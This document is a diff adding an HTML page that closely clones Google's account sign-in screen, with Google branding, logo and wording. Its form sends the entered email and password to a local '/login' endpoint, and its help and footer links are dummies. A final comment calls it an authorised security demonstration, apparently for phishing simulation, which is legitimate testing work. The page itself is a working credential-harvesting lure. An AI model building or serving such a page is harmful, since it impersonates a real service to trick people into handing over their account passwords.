@@ -1,0 +1,69 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Sign in – Google Accounts</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:'Google Sans',Roboto,Arial,sans-serif;background:#fff;color:#202124;display:flex;flex-direction:column;align-items:center;min-height:100vh;padding:48px 16px 24px}
+.card{width:100%;max-width:400px}
+.glogo{display:flex;align-items:center;gap:2px;margin-bottom:32px}
+.glogo span{font-size:22px;font-weight:400}
+.g-b{color:#4285F4}.g-o1{color:#EA4335}.g-o2{color:#FBBC05}.g-g{color:#34A853}.g-l{color:#4285F4}.g-e{color:#EA4335}
+h1{font-size:24px;font-weight:400;margin-bottom:8px}
+.sub{font-size:14px;color:#444746;margin-bottom:28px}
+input{display:block;width:100%;padding:13px 15px;border:1px solid #747775;border-radius:4px;font-size:16px;outline:none;transition:border .15s,box-shadow .15s;background:#fff;color:#202124;margin-bottom:8px}
+input:focus{border-color:#1a73e8;box-shadow:0 0 0 2px rgba(26,115,232,.2)}
+.hint{font-size:12px;color:#444746;margin-bottom:24px}
+.hint a{color:#1a73e8;text-decoration:none}
+.actions{display:flex;justify-content:space-between;align-items:center;margin-top:28px}
+.btn-create{color:#1a73e8;font-size:14px;font-weight:600;background:none;border:0;cursor:pointer;padding:0}
+.btn-next{background:#1a73e8;color:#fff;border:0;border-radius:4px;padding:10px 24px;font-size:14px;font-weight:600;cursor:pointer;min-width:72px}
+.btn-next:active{background:#1357be}
+.sep{height:1px;background:#e0e0e0;margin:28px 0}
+.foot{text-align:center;font-size:11px;color:#70757a}
+.foot a{color:#1a73e8;text-decoration:none;margin:0 4px}
+</style>
+</head>
+<body>
+<div class="card">
+  <!-- Google wordmark -->
+  <div class="glogo">
+    <svg width="75" height="24" viewBox="0 0 272 92" xmlns="http://www.w3.org/2000/svg">
+      <path fill="#EA4335" d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/>
+      <path fill="#FBBC05" d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/>
+      <path fill="#4285F4" d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z"/>
+      <path fill="#34A853" d="M225 3v65h-9.5V3h9.5z"/>
+      <path fill="#EA4335" d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z"/>
+      <path fill="#4285F4" d="M35.29 41.41V32h31.97c.31 1.64.47 3.58.47 5.68 0 7.06-1.93 15.79-8.15 22.01-6.05 6.3-13.78 9.66-24.02 9.66C16.32 69.35.36 53.89.36 34.74.36 15.59 16.32.13 35.56.13c10.5 0 17.98 4.12 23.6 9.49l-6.64 6.64c-4.03-3.78-9.49-6.72-16.97-6.72-13.86 0-24.7 11.17-24.7 25.03 0 13.86 10.84 25.03 24.7 25.03 8.99 0 14.11-3.61 17.39-6.89 2.66-2.66 4.41-6.46 5.1-11.65H35.29z"/>
+    </svg>
+  </div>
+
+  <h1>Sign in</h1>
+  <p class="sub">to continue to Google Account</p>
+
+  <form method="POST" action="/login" id="f">
+    <input name="u" type="email" inputmode="email" autocomplete="email"
+           placeholder="Email or phone" required autofocus>
+    <p class="hint">Not your computer? Use a Private Window to sign in. <a href="#">Learn more</a></p>
+    <input name="p" type="password" autocomplete="current-password"
+           placeholder="Enter your password" required>
+    <div class="actions">
+      <button type="button" class="btn-create" onclick="history.back()">Forgot email?</button>
+      <button type="submit" class="btn-next">Next</button>
+    </div>
+  </form>
+
+  <div class="sep"></div>
+  <div class="foot">
+    <a href="#">English (United Kingdom)</a>
+    <span style="margin:0 8px;color:#e0e0e0">|</span>
+    <a href="#">Help</a>
+    <a href="#">Privacy</a>
+    <a href="#">Terms</a>
+  </div>
+</div>
+<!-- Andraste security demonstration — authorised testing only -->
+</body>
+</html>
